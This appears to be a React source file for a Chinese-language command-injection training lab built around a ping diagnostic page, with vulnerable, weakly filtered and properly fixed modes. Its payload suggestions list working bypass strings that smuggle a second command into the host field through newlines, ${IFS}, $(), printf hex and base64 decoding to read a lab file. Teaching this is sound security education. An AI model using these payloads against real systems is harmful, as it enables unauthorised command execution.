import { Alert, Button, Card, Form, Input, Row, Col, Space, Typography, Tag, Collapse } from 'antd';
import { CodeOutlined, BugOutlined, SafetyCertificateOutlined, ThunderboltOutlined, FileTextOutlined, SearchOutlined, WifiOutlined } from '@ant-design/icons';
import { useState } from 'react';
import { commandExecutionApi } from '../../utils/api';
import useRequestRunner from '../../hooks/useRequestRunner';
import { reportCoachUi } from '../xss/_shared/coachUi';
import DarkSelect from '../../components/DarkSelect';

const { Title, Paragraph, Text } = Typography;

const MODE_OPTIONS = [
  { value: 'vuln', label: 'VULN（原始漏洞）' },
  { value: 'weak', label: 'WEAK（错误修复）' },
  { value: 'safe', label: 'SAFE（正确修复）' },
];

const WEAK_LEVEL_OPTIONS = [
  { value: 1, label: 'WEAK-1：拦截分号、逻辑与、管道符' },
  { value: 2, label: 'WEAK-2：拦截分号、逻辑与、管道符、反引号、$()、换行符' },
  { value: 3, label: 'WEAK-3：拦截空格（替换为空）' },
  { value: 4, label: 'WEAK-4：拦截斜杠、cat、passwd' },
  { value: 5, label: 'WEAK-5：拦截 cat、passwd（需要自解码）' },
];

const PAYLOAD_SUGGESTIONS = {
  1: [
    {
      kind: '换行符绕过',
      expect: '使用 %0a 换行符执行第二条命令，读取 lab 内 hosts',
      value: '127.0.0.1%0acat hosts',
    },
    {
      kind: '逻辑与',
      expect: '使用 & 连接第二条命令，读取 lab 内 hosts',
      value: '127.0.0.1& cat hosts',
    },
    {
      kind: '逻辑或',
      expect: '使用 || 前失败则执行后者，读取 lab 内 hosts',
      value: '127.0.0.1 || cat hosts',
    },
  ],
  2: [
    {
      kind: '变量拼接',
      expect: '${IFS} 代替空格，拼接出 cat hosts，读取 lab 内 hosts',
      value: '127.0.0.1${IFS}cat${IFS}hosts',
    },
    {
      kind: '命令替换',
      expect: '$() 执行 cat hosts 并将输出拼进命令行',
      value: '127.0.0.1$(cat${IFS}hosts)',
    },
  ],
  3: [
    {
      kind: 'IFS 替代空格',
      expect: '分号后 ${IFS} 替代空格，读取 lab 内 hosts',
      value: '127.0.0.1;cat${IFS}hosts',
    },
    {
      kind: '制表符',
      expect: '制表符 %09 替代空格，读取 lab 内 hosts',
      value: '127.0.0.1;cat%09hosts',
    },
  ],
  4: [
    {
      kind: 'IFS 代替空格',
      expect: '使用 ${IFS} 代替空格，读取 lab 内 hosts',
      value: '127.0.0.1;cat${IFS}hosts',
    },
    {
      kind: 'printf 还原 cat',
      expect: '使用 printf 还原 cat 命令，读取 lab 内 hosts',
      value: '127.0.0.1;$(printf%09\\x63\\x61\\x74)%09hosts',
    },
  ],
  5: [
    {
      kind: 'Base64 解码',
      expect: 'base64 -d 解码 "Y2F0IGhvc3Rz" 得到 cat hosts，读取 lab 内 hosts',
      value: '127.0.0.1;$(echo%09Y2F0IGhvc3Rz%09|%09base64%09-d)',
    },
    {
      kind: 'printf 十六进制',
      expect: 'printf \\x63\\x61\\x74 还原 cat，读取 lab 内 hosts',
      value: '127.0.0.1;$(printf%09\\x63\\x61\\x74)%09hosts',
    },
  ],
};

export default function CommandExecutionNetwork() {
  const [mode, setMode] = useState('vuln');
  const [weakLevel, setWeakLevel] = useState(1);
  const [host, setHost] = useState('127.0.0.1');
  const { loading, result, run } = useRequestRunner();

  const handleExecute = async () => {
    try {
      console.log('调用 API:', mode, host, weakLevel);
      await run('ping', () => commandExecutionApi.ping(mode, host, weakLevel));
      
      reportCoachUi({
        context: `command_execution_network_${mode}`,
        mode: mode,
        focus: 'execute',
        input: host,
        extras: { weakLevel }
      });
    } catch (error) {
      console.error('Execution failed:', error);
      console.error('Error details:', error.response?.data || error.message);
    }
  };

  const currentSuggestions = PAYLOAD_SUGGESTIONS[weakLevel] || [];
  const data = result?.data?.data;

  return (
    <div style={{ maxWidth: 1440, width: '100%', margin: '0 auto' }}>
      <Title level={2} style={{ color: '#e6edf3', fontWeight: 600, marginBottom: 8 }}>
        <WifiOutlined /> 网络诊断 - Ping 命令注入
      </Title>
      <Paragraph style={{ color: '#8b9cb3', fontSize: 15, marginBottom: 18 }}>
        模拟网络设备管理系统的命令注入漏洞。通过 ping 命令测试网络连通性，
        但存在命令注入风险，允许攻击者执行任意系统命令。
      </Paragraph>

      <Row gutter={16} align="stretch">
        <Col xs={24} lg={16} style={{ display: 'flex' }}>
          <Card
            title={
              <Space>
                <ThunderboltOutlined style={{ color: '#94a3b8' }} />
                <span style={{ color: '#e6edf3' }}>测试界面</span>
              </Space>
            }
            style={{ background: '#161f2e', border: '1px solid #2d3a4d', width: '100%', height: '100%' }}
          >
            <Alert
              type="info"
              showIcon
              title="网络设备管理：输入目标主机地址，系统会执行 ping 命令测试网络连通性。"
              style={{ marginBottom: 12, background: 'rgba(56, 189, 248, 0.06)', border: '1px solid #2d3a4d' }}
            />

            <Form layout="vertical">
              <Row gutter={16}>
                <Col span={8}>
                  <Form.Item label="模式选择">
                    <DarkSelect
                      value={mode}
                      onChange={setMode}
                      options={MODE_OPTIONS}
                      style={{ width: '100%' }}
                    />
                  </Form.Item>
                </Col>
                
                <Col span={8}>
                  <Form.Item label="弱级别（WEAK 模式）">
                    <DarkSelect
                      value={weakLevel}
                      onChange={setWeakLevel}
                      options={WEAK_LEVEL_OPTIONS}
                      style={{ width: '100%' }}
                      disabled={mode !== 'weak'}
                    />
                  </Form.Item>
                </Col>
                
                <Col span={8}>
                  <Form.Item label="目标主机">
                    <Input
                      value={host}
                      onChange={(e) => setHost(e.target.value)}
                      placeholder="输入目标主机地址"
                      style={{ width: '100%' }}
                    />
                  </Form.Item>
                </Col>
              </Row>
              
              <Form.Item>
                <Button
                  type="primary"
                  onClick={handleExecute}
                  loading={loading}
                  icon={<CodeOutlined />}
                  style={{ width: 120 }}
                >
                  执行 Ping
                </Button>
              </Form.Item>
            </Form>

            {data && (
              <div style={{ marginTop: 16 }}>
                <Text type="secondary" style={{ fontSize: 12 }}>
                  执行结果
                </Text>
                <div style={{
                  marginTop: 8,
                  padding: 12,
                  borderRadius: 8,
                  background: '#0b1020',
                  border: '1px solid #2d3a4d',
                }}>
                  <Space orientation="vertical" size={8} style={{ width: '100%' }}>
                    <div>
                      <Text strong style={{ color: '#e6edf3' }}>构建的命令：</Text>
                      <Text code style={{ color: '#8b9cb3', marginLeft: 8 }}>
                        {data.cmdBuilt}
                      </Text>
                    </div>
                    
                    <div>
                      <Text strong style={{ color: '#e6edf3' }}>退出码：</Text>
                      <Tag color={data.exitCode === 0 ? 'green' : 'red'} style={{ marginLeft: 8 }}>
                        {data.exitCode}
                      </Tag>
                    </div>
                    
                    {data.stderrPreview && (
                      <div>
                        <Text strong style={{ color: '#e6edf3' }}>错误信息：</Text>
                        <Alert
                          type="error"
                          showIcon
                          style={{ marginTop: 8, background: '#0f1419', border: '1px solid #2d3a4d' }}
                          title={<span style={{ color: '#e6edf3' }}>{data.stderrPreview}</span>}
                        />
                      </div>
                    )}
                    
                    {data.stdoutPreview && (
                      <div>
                        <Text strong style={{ color: '#e6edf3' }}>输出结果：</Text>
                        <pre style={{
                          background: '#0f1419',
                          color: '#8b9cb3',
                          padding: 12,
                          borderRadius: 6,
                          marginTop: 8,
                          fontSize: 13,
                          lineHeight: 1.4,
                          whiteSpace: 'pre-wrap',
                          wordBreak: 'break-all',
                          border: '1px solid #2d3a4d',
                        }}>
                          {data.stdoutPreview}
                        </pre>
                      </div>
                    )}
                  </Space>
                </div>
              </div>
            )}
          </Card>
        </Col>

        <Col xs={24} lg={8} style={{ display: 'flex' }}>
          <Card
            title={<span style={{ color: '#e6edf3' }}>Security Coach</span>}
            style={{ background: '#161f2e', border: '1px solid #2d3a4d', width: '100%', height: '100%' }}
          >
            <div style={{ color: '#8b9cb3', fontSize: 12, lineHeight: 1.7 }}>
              <div>当前练习点：</div>
              <div>类型：命令注入</div>
              <div>场景：网络诊断</div>
              <div>模式：{mode.toUpperCase()}</div>
              {mode === 'weak' && (
                <div style={{ marginTop: 6 }}>
                  <Text type="secondary" style={{ fontSize: 12 }}>
                    WEAK 表示：做了部分处理但仍可绕过（点开查看原因）
                  </Text>
                </div>
              )}
            </div>

            <div style={{ marginTop: 12 }}>
              <Text type="secondary" style={{ fontSize: 12 }}>
                你的输入会被插入到这里：
              </Text>
              <div style={{
                marginTop: 8,
                padding: 12,
                borderRadius: 10,
                background: '#0b1020',
                border: '1px solid #2d3a4d',
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-word',
                fontFamily: 'JetBrains Mono, ui-monospace, monospace',
              }}>
                ping {host}
              </div>
            </div>

            <Collapse
              size="small"
              style={{ marginTop: 12, background: 'rgba(56, 189, 248, 0.04)', border: '1px solid #2d3a4d' }}
              items={[
                ...(mode === 'weak'
                  ? [
                      {
                        key: 'why-weak',
                        label: `为什么是 WEAK-${weakLevel}？`,
                        children: (
                          <div style={{ color: '#c6d3e5', fontSize: 12, lineHeight: 1.8 }}>
                            <div style={{ marginBottom: 8 }}>
                              {(() => {
                                const weakSummaries = {
                                  1: [
                                    'WEAK-1 做了什么：只拦截分号、逻辑与、管道符（字符串替换）。',
                                    'WEAK-1 漏了什么：没有对其他绕过方式做处理（如换行符、变量拼接）。',
                                    '怎么练出来：用 %0a 等输入对照输出，看是否被正确拦截。',
                                  ],
                                  2: [
                                    'WEAK-2 做了什么：在 WEAK-1 基础上增加了对反引号、$()、换行符的拦截。',
                                    'WEAK-2 漏了什么：没有对变量拼接（${IFS}）做处理。',
                                    '怎么练出来：用 ${IFS} 等输入对照输出，看是否被正确拦截。',
                                  ],
                                  3: [
                                    'WEAK-3 做了什么：拦截空格（替换为空）。',
                                    'WEAK-3 漏了什么：没有对其他绕过方式做处理。',
                                    '怎么练出来：用 ${IFS} 或制表符等输入对照输出，看是否被正确拦截。',
                                  ],
                                  4: [
                                    'WEAK-4 做了什么：拦截斜杠、cat、passwd（黑名单）。',
                                    'WEAK-4 漏了什么：没有对命令还原方式做处理（如 printf、变量切片）。',
                                    '怎么练出来：用 ${PATH:0:1} 或 printf 等输入对照输出，看是否被正确拦截。',
                                  ],
                                  5: [
                                    'WEAK-5 做了什么：只拦截 cat、passwd（需要自解码）。',
                                    'WEAK-5 漏了什么：没有对编码绕过做处理。',
                                    '怎么练出来：用 base64 或十六进制等编码方式对照输出，看是否被正确拦截。',
                                  ],
                                };
                                return (weakSummaries[weakLevel] || []).map((x) => (
                                  <div key={x}>- {x}</div>
                                ));
                              })()}
                            </div>
                            <Text type="secondary" style={{ fontSize: 12 }}>
                              当前输入字段
                            </Text>
                            <div style={{
                              marginTop: 8,
                              padding: 10,
                              borderRadius: 10,
                              background: '#0b1020',
                              border: '1px solid #2d3a4d',
                              fontFamily: 'JetBrains Mono, ui-monospace, monospace',
                              whiteSpace: 'pre-wrap',
                              wordBreak: 'break-word',
                            }}>
                              <div style={{ color: '#8b9cb3' }}>input：</div>
                              <div style={{ marginBottom: 8 }}>{host || '(空)'}</div>
                              <div style={{ color: '#8b9cb3' }}>output：</div>
                              <div>ping {host}</div>
                            </div>
                          </div>
                        ),
                      },
                    ]
                  : []),
                {
                  key: 'payloads',
                  label: '载荷建议',
                  children: (
                    <div style={{ marginTop: 4, display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                      {currentSuggestions.map((p) => (
                        <Tag
                          key={p.kind}
                          title={p.expect}
                          color="blue"
                          style={{
                            cursor: 'pointer',
                            fontFamily: 'JetBrains Mono, ui-monospace, monospace',
                            maxWidth: '100%',
                            whiteSpace: 'normal',
                            wordBreak: 'break-word',
                            lineHeight: 1.25,
                            paddingBlock: 6,
                            paddingInline: 10,
                            marginInlineEnd: 0,
                          }}
                          onClick={() => {
                            setHost(p.value);
                            reportCoachUi({
                              context: `command_execution_network_${mode}_payload_click`,
                              mode: mode,
                              focus: 'payload_click',
                              input: p.value,
                              extras: { weakLevel }
                            });
                          }}
                        >
                          <div style={{ fontWeight: 600 }}>{p.kind}</div>
                          <div style={{ opacity: 0.92 }}>{p.value}</div>
                        </Tag>
                      ))}
                    </div>
                  ),
                },
              ]}
            />
          </Card>
        </Col>
      </Row>
    </div>
  );
}
